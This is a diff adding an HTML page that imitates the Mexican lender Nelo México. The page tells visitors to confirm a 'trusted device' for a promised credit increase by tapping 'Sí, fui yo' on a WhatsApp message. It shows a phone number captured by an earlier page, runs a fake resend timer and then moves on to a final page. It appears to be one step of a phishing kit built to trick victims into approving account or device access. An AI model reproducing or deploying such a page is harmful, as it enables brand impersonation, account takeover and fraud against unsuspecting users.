@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nelo México - Confirmación</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background-color: #ffffff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+    h1 {
+      font-size: 1.4em;
+      color: #000; /* letras negras */
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 1em;
+      color: #000; /* letras negras */
+      margin-bottom: 15px;
+    }
+    .number {
+      font-weight: bold;
+      color: #0066cc; /* azul para el número */
+      margin-bottom: 20px;
+    }
+    .timer {
+      font-size: 0.9em;
+      color: #000;
+      margin-bottom: 20px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0066cc;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 1em;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #005bb5;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h1>Verifica tu dispositivo de confianza para recibir tu aumento.</h1>
+    <p>Te enviamos un mensaje de WhatsApp al:</p>
+    <div class="number" id="numero">+52 ** **** 7286</div>
+    <p>Abre el mensaje y haz clic en <b>"Sí, fui yo"</b>.</p>
+    <div class="timer">Reenviar el mensaje en <span id="countdown">12</span>s</div>
+    <p style="font-size:0.9em; color:#000;">
+      🔒 Nuestro equipo de soporte te pedirá verificar tu dispositivo de confianza para recibir tu aumento.<br>
+      <p>Abre el mensaje que te enviamos via WhatsApp y haz clic en <b>"Sí, fui yo"</b>.</p>
+    </p>
+    <button onclick="window.location.href='final.html'">Continuar</button>
+  </div>
+
+  <script>
+    // Mostrar número guardado desde index.html
+    const numeroGuardado = localStorage.getItem("telefono");
+    if (numeroGuardado) {
+      document.getElementById("numero").textContent = "+52 " + numeroGuardado;
+    }
+
+    // Temporizador de reenvío
+    let seconds = 12;
+    const countdown = document.getElementById("countdown");
+    const interval = setInterval(() => {
+      seconds--;
+      countdown.textContent = seconds;
+      if (seconds <= 0) {
+        clearInterval(interval);
+        countdown.textContent = "0";
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
